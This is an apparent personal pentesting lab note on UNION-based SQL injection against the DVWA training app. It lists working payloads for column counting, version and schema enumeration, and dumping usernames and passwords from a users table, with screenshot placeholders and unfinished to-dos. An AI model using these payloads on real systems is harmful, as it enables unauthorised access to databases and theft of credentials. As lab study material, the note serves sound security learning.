# 01 - Database Reconnaissance

#sql-injection #union #dvwa

## 1.1 - Dump Database

### 1.1.1 - Columns Enumeration

^78ef92

#### 1.1.1.1 - UNION Detection

We can double confirm using [[Pentesting Phases/WebApp Hacking/Injection/SQL Injection/01 - In-Band SQL Injection/Lab/DVWA/Difficulty/Low/Manual/02 - Error-Based Query SQL Injection/01 - Database Reconnaissance#^f521af|error-based (ORDER BY)]] fields enumeration.

```sql
' UNION SELECT 1, 2#

' UNION SELECT 1, 2, 3#

' UNION SELECT NULL, NULL#

' UNION SELECT NULL, NULL, NULL#
```

### 1.1.2 - Discovery and Enumeration

#### 1.1.2.1 - UNION Enumeration

Sometimes when we try to retrieve error messages. Sometimes the warning messages may not provide us the SQL server software might be running. However, we can discover it even further to grab the version of the DBMS back-end software is running.

```sql
' UNION SELECT 1, @@VERSION#

' OR 1=1 UNION SELECT 1, @@VERSION#

' UNION SELECT NULL, @@VERSION#

' OR 1=1 UNION SELECT NULL, @@VERSION#
```

#### 1.1.2.2 - Schema Database Enumeration

```sql
' UNION SELECT NULL, schema_name FROM information_schema.schemata#
```

`<insert screenshot>`

Let's enumerate the tables

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables#

' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()#
```

`<Insert screenshot>`

Let's narrow it down

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_name like 'user%'#
```

`<Insert screenshot>`

Let's note down the tables we've discovered that are potential to retrieve data

```
users
user
```

Let's enumerate the columns

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns#
```

Let's note down the columns we've discovered that are potential to retrieve data

```
USER
password
```

### 1.1.3 - Data Exfiltration

#### 1.1.3.1 - Exploit

```sql
' UNION SELECT USER, password FROM users#
```

`<Insert screenshot>`

```sql
' UNION SELECT user || ':' || password, NULL FROM users#

' UNION SELECT concat(user,':',password), NULL FROM users#

' UNION SELECT group_concat(user,':',password), NULL FROM users#
```

`<Insert screenshot>`

```sql
' UNION SELECT concat(user,'~',password), NULL FROM users#

' UNION SELECT group_concat(user,'~',password), NULL FROM users#
```

`<Insert screenshot>`

```sql
' UNION SELECT concat(user,'\n',password), NULL FROM users#

' UNION SELECT concat(user,0x0a,password), NULL FROM users#

' UNION SELECT group_concat(user,0x0a,password), NULL FROM users#
```

`<Insert screenshot>`

TODO: Use john the ripper and Name-That-Hash to demonstrate cracking weak passwords with a dictionary list after dumping the credentials

TODO: Add XSS for easier view

## References

- [SecurityIdiots: XSS Injection with SQLi (XSSQLi)](https://www.securityidiots.com/Web-Pentest/SQL-Injection/xss-injection-with-sqli-xssqli.html)